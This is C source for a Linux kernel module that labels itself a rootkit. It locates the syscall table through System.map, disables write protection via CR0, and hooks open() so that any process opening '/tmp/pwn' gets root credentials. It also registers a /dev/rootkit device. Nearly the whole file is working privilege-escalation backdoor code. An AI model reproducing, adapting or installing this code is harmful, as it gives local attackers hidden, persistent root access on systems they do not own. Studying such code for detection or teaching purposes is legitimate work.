/*
 * open & release: < /dev/rootkit
 * write: echo x > /dev/rootkit
 * read: dd bs=1 count=1 < /dev/rootkit
 *
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/page.h>
#include <linux/sched.h>
#include <asm/current.h>
#include <linux/proc_fs.h>
#include <linux/slab.h> // kmalloc()
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/file.h>
#include <linux/version.h>
#include <linux/fcntl.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Romain. B");
MODULE_DESCRIPTION("Es. Rootkit");

#define DEVICE_NAME "rootkit"
#define PROC_V "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_LEN 256
#define BUF_SIZE  64

static char buffer[BUF_SIZE];
static size_t num = 0;
static int major = 0; /*** Major number ***/
unsigned long long *syscall_table;
int sys_found = 0;

asmlinkage long (*orig_open)(const char *filename, int flags, umode_t mode);
asmlinkage long new_open(const char *filename, int flags, umode_t mode)
{
	struct cred *credential = NULL;

	if (strcmp(filename, "/tmp/pwn") == 0) {
		printk(KERN_INFO"# Filename: %s\n", filename);
		credential = prepare_creds();
		
		credential->uid = credential->gid = credential->euid = 
		credential->egid = credential->suid = credential->sgid =
		credential->fsuid = credential->fsgid = 0;

		commit_creds(credential);
	}

	return orig_open(filename, flags, mode);
}

char *search_file(char *buf)
{
	struct file* f;
	char *ver;

	mm_segment_t oldfs;
	oldfs = get_fs();
	set_fs(KERNEL_DS);
	f = filp_open(PROC_V, O_RDONLY, 0);
	if (IS_ERR(f) || f == NULL)
		return NULL;

	memset(buf, 0, MAX_LEN);
	vfs_read(f, buf, MAX_LEN, &f->f_pos);
	ver = strsep(&buf, " ");
	ver = strsep(&buf, " ");
	ver = strsep(&buf, " ");

	filp_close(f, 0);
	set_fs(oldfs);
	return ver;
}

static int find_sys_call_table(char *kern_ver)
{
	char buf[MAX_LEN];
	int i = 0;
	char *filename;
	char *p;
	struct file *f = NULL;

	mm_segment_t oldfs;

	oldfs = get_fs();
	set_fs (KERNEL_DS);

	filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);

	if ( filename == NULL ) {
		return -1;
	}

	memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);

	strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
	strncat(filename, kern_ver, strlen(kern_ver));

	printk(KERN_ALERT "\nPath %s\n", filename);

	f = filp_open(filename, O_RDONLY, 0);

	if ( IS_ERR(f) || ( f == NULL )) {
		return -1;
	}

	memset(buf, 0x0, MAX_LEN);

	p = buf;

	while (vfs_read(f, p+i, 1, &f->f_pos) == 1) {

		if ( p[i] == '\n' || i == 255 ) {

			i = 0;

			if ( (strstr(p, "sys_call_table")) != NULL ) {

				char *sys_string;

				sys_string = kmalloc(MAX_LEN, GFP_KERNEL);	

				if ( sys_string == NULL ) { 

					filp_close(f, 0);
					set_fs(oldfs);
					kfree(filename);
					return -1;
				}

				memset(sys_string, 0, MAX_LEN);
				strncpy(sys_string, strsep(&p, " "), MAX_LEN);
				syscall_table = (unsigned long long *) simple_strtoll(sys_string, NULL, 16);
				kfree(sys_string);
				break;
			}

			memset(buf, 0x0, MAX_LEN);
			continue;
		}
		i++;
	}

	filp_close(f, 0);
	set_fs(oldfs);
	kfree(filename);

	return 0;
}

static int rootk_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
	unsigned int value = cmd;
	printk(KERN_INFO"%s: ioctl() %d %ld\n", DEVICE_NAME, cmd, arg);

	if (copy_to_user((unsigned int*)arg, &value, sizeof(int))) {		
		printk(KERN_INFO"copy successful");
	}

	return (0);
}

static int rootk_open(struct inode *inode, struct file *file)
{
	printk(KERN_INFO"%s: open()\n", DEVICE_NAME);
	return (0);
}

static int rootk_release(struct inode *inode, struct file *file)
{
	printk(KERN_INFO"%s: release()\n", DEVICE_NAME);
	return (0);
}

static ssize_t rootk_write(struct file *file, const char *buf, size_t count, loff_t *ppos)
{
	size_t real;
	printk(KERN_INFO"%s: write()\n", DEVICE_NAME);

	real = min((size_t)BUF_SIZE, count);
	if (real)
		if (copy_from_user(buffer, buf, real))
			return -EFAULT;

	num = real;
	printk(KERN_DEBUG"%s: wrote %ld/%ld chars %s\n", DEVICE_NAME, real, count, buffer);
	return (real);
}

static ssize_t rootk_read(struct file *file, char *buf, size_t count, loff_t *ppos)
{
	size_t real;
	printk(KERN_INFO"%s: read()\n", DEVICE_NAME);

	real = min(num, count);
	if (real) 
		if (copy_to_user(buf, buffer, real)) {
			printk(KERN_INFO"failed...");
			return -EFAULT;
		}

	num = 0;
	printk(KERN_DEBUG"%s: read() %ld/%ld chars %s\n", DEVICE_NAME, real, count, buffer);
	return (real);
}

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = rootk_read,
	.write = rootk_write,
	.open = rootk_open,
	.release = rootk_release,
	.unlocked_ioctl = rootk_ioctl
};

static int implement_hook()
{
	char *kern_ver;
	char *buf;

	buf = kmalloc(MAX_LEN, GFP_KERNEL);
	if (buf == NULL) {
		sys_found = 1;
		return -EFAULT;
	}
		
	kern_ver = search_file(buf);
	printk(KERN_INFO"Kernel version: %s\n", buf);
	if (find_sys_call_table(kern_ver) == -1) {
		sys_found = 1;
		return -EFAULT;
	}

	sys_found = 0;
	
	write_cr0(read_cr0() & (~0x10000));
	orig_open = syscall_table[__NR_open];
	syscall_table[__NR_open] = new_open;
	write_cr0(read_cr0() | 0x10000);

	kfree(buf);

	buf = NULL;
	return (0);
}

static int __init init(void) {
	int ret;
	
	ret = register_chrdev(major, DEVICE_NAME, &fops);
	if (ret < 0) {
		printk(KERN_WARNING"%s unable to get a major\n", DEVICE_NAME);
		return ret;
	}

	if (major == 0) major = ret;

	printk(KERN_INFO"major: %d\n", major);

	/*
	 * Implement the hook on sys_open() 
	 */

	if (implement_hook() == -EFAULT)
		printk(KERN_DEBUG"Error during the implementation of the sys_open's hook\n");

	return (0);	
}

static void __exit exit_clean(void) {

	unregister_chrdev(major, DEVICE_NAME); 
	printk(KERN_INFO"%s unloaded\n", DEVICE_NAME);
	
	if (sys_found == 0) {
		write_cr0(read_cr0() & (~0x10000));
		syscall_table[__NR_open] = orig_open;
		write_cr0(read_cr0() | 0x10000);
	}

	return;
}

module_init(init);
module_exit(exit_clean);


